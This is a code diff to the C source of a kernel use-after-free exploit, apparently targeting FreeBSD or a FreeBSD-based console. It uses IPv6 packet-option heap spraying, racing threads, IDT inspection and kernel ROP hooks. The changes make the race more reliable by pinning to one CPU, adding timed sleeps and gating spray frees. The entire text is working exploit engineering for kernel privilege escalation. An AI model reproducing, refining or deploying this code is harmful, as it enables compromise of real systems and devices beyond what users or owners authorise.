@@ -24,7 +24,6 @@
 #define SPRAY_SIZE 32
 #define SPRAY_TOTAL 512
 
-#define NANOSLEEP_200US "\0\0\0\0\0\0\0\0\x40\x0d\x03\0\0\0\0\0"
 #define NANOSLEEP_100US "\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0"
 #define NANOSLEEP_75US "\0\0\0\0\0\0\0\0\x38\x2a\x01\0\0\0\0\0"
 #define NANOSLEEP_50US "\0\0\0\0\0\0\0\0\x88\x13\0\0\0\0\0\0"
@@ -141,6 +140,14 @@ struct opaque {
     int* spray_sock;
 };
 
+
+void pin_to_cpu(int cpu) {
+    cpuset_t set;
+    CPU_ZERO(&set);
+    CPU_SET(cpu, &set);
+    cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_PID, getpid(), sizeof(set), &set);
+}
+
 void* use_thread(void* arg) {
     struct opaque* o = (struct opaque*)arg;
     char buf[CMSG_SPACE(sizeof(int))] = {0};
@@ -177,10 +184,15 @@ void* free_thread(void* arg) {
 }
 
 void trigger_uaf(struct opaque* o) {
+    pin_to_cpu(1);
+
     o->triggered = o->padding = o->done1 = o->done2 = 0;
+
     pthread_t th1, th2;
     pthread_create(&th1, NULL, use_thread, o);
     pthread_create(&th2, NULL, free_thread, o);
+
+    nanosleep(NANOSLEEP_50US, NULL);
 
     int attempts = 0;
     const int MAX_SPRAY = 32;
@@ -194,8 +206,10 @@ void trigger_uaf(struct opaque* o) {
         if (get_tclass(o->master_sock) == TCLASS_SPRAY)
             break;
 
-        for (int i = 0; i < MAX_SPRAY; i++) {
-            free_pktopts(o->spray_sock[i]);
+        if (!o->triggered) {
+            for (int i = 0; i < MAX_SPRAY; i++) {
+                free_pktopts(o->spray_sock[i]);
+            }
         }
 
         nanosleep(NANOSLEEP_100US, NULL);
@@ -203,7 +217,7 @@ void trigger_uaf(struct opaque* o) {
 
     o->triggered = 1;
 
-   for (int wait = 0; wait < 100 && (!o->done1 || !o->done2); wait++) {
+    for (int wait = 0; wait < 100 && (!o->done1 || !o->done2); wait++) {
         nanosleep(NANOSLEEP_100US, NULL);
     }
 }
@@ -330,14 +344,12 @@ void flush_ipv6_option_pools() {
 }
 
 void validate_and_repair_kernel_structures() {
-    // Verify critical kernel structures are intact
     for (int check_pass = 0; check_pass < 3; check_pass++) {
         unsigned long long current_idt_base;
         unsigned short current_idt_size;
 
         sidt(&current_idt_base, &current_idt_size);
 
-        // If IDT looks corrupted, trigger memory stabilization
         if (current_idt_size < 0xFE || current_idt_base == 0) {
             aggressive_heap_reclamation();
             flush_ipv6_option_pools();
@@ -391,13 +403,6 @@ void save_kernel_state() {
     sidt(&original_idt_base, &original_idt_size);
 }
 
-void pin_to_cpu(int cpu) {
-    cpuset_t set;
-    CPU_ZERO(&set);
-    CPU_SET(cpu, &set);
-    cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_PID, getpid(), sizeof(set), &set);
-}
-
 void (*enter_krop)(void);
 extern uint64_t krop_idt_base;
 extern uint64_t krop_jmp_crash;
@@ -419,7 +424,6 @@ int main() {
 
     save_kernel_state();
     
-    // Pin to single CPU early to prevent cross-CPU race conditions during UAF
     pin_to_cpu(1);
 
     for (int i = 0; i < 16; i++)
